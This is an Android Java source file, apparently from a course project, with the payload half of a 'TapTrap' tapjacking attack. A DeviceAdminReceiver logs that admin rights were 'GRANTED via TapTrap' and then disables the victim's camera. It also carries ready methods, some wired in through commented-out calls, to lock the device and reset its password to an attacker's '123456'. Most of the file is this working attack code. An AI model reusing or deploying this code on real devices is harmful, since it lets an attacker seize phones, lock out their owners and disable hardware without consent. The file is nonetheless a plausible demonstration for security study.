package com.example.inf2007_mad_j1847.test;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import androidx.camera.core.Camera;

public class AppDeviceAdminReceiver extends DeviceAdminReceiver {

    private static final String TAG = "TapTrap-Admin";

    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        // 🔴 TAPTRAP SUCCEEDED!
        Log.d(TAG, "🔥 Device Admin GRANTED via TapTrap!");
        Log.d(TAG, "connect to server ");

        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        //String pw_context = getPasswordQualityString(context);
        //Log.d(TAG, pw_context);
        // add command here

//        String attackerPassword = "123456";
//        boolean passwordChanged = changeDevicePassword(context, attackerPassword);
//        lockDevice(context);

        disableCamera(context);
        // Optional: Post-attack actions here
        // DevicePolicyManager dpm = getManager(context);
        // dpm.lockNow(); // Example: lock device immediately
    }

    // ========== CENTRALIZED DPM GETTER ==========
    /**
     * Get DevicePolicyManager instance - ALL commands use this
     */
    private DevicePolicyManager getDpm(Context context) {
        return (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
    }

    /**
     * Get ComponentName - ALL commands use this
     */
    private ComponentName getAdmin(Context context) {
        return new ComponentName(context, AppDeviceAdminReceiver.class);
    }

    /**
     * 1. Lock device immediately
     */
    public void lockDevice(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        Log.d(TAG, " Locking device now");
        dpm.lockNow();

    }

    /**
     * 2. Disable camera
     */
    public void disableCamera(Context context) {
        try {
            DevicePolicyManager dpm = getDpm(context);
            ComponentName admin = getAdmin(context);

            Log.d(TAG, " Disabling camera");
            dpm.setCameraDisabled(admin, true);
            Log.d(TAG, " end of Disabling camera");

        }catch (Exception e) {
            Log.d(TAG, "error disabling camera: " + e.getMessage());
        }



//        try {
//            Camera camera = Camera.open();
//            camera.release();
//            Log.d(TAG, "⚠️ Camera still works - something wrong!");
//        } catch (Exception e) {
//            Log.d(TAG, "✅ Camera disabled successfully: " + e.getMessage());
//        }

    }

    /**
     * 3. Enable camera
     */
    public void enableCamera(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        ComponentName admin = getAdmin(context);

        Log.d(TAG, " Enabling camera");
        dpm.setCameraDisabled(admin, false);

    }

    public boolean changeDevicePassword(Context context, String newPassword) {
        DevicePolicyManager dpm = getDpm(context);

        Log.d(TAG, "🔑 Attempting to change password");

        // Now change the password
        boolean success = dpm.resetPassword(newPassword, 0);

        if (success) {
            Log.d(TAG, "✓ Password successfully changed to: " + newPassword);

        } else {
            Log.e(TAG, "✗ Password change FAILED");

        }

        return success;
    }


    public String getPasswordQualityString(Context context) {
        DevicePolicyManager dpm = getDpm(context);
        ComponentName admin = getAdmin(context);

        int quality = dpm.getPasswordQuality(admin);

        switch(quality) {
            case DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED:
                return "No password requirements";
            case DevicePolicyManager.PASSWORD_QUALITY_SOMETHING:
                return "Password required (any)";
            case DevicePolicyManager.PASSWORD_QUALITY_NUMERIC:
                return "Numeric PIN required";
            case DevicePolicyManager.PASSWORD_QUALITY_NUMERIC_COMPLEX:
                return "Complex numeric (no repeats)";
            case DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC:
                return "Alphabetic password required";
            case DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC:
                return "Alphanumeric password required";
            case DevicePolicyManager.PASSWORD_QUALITY_COMPLEX:
                return "Complex password required";
            default:
                return "Unknown quality: " + quality;
        }
    }

}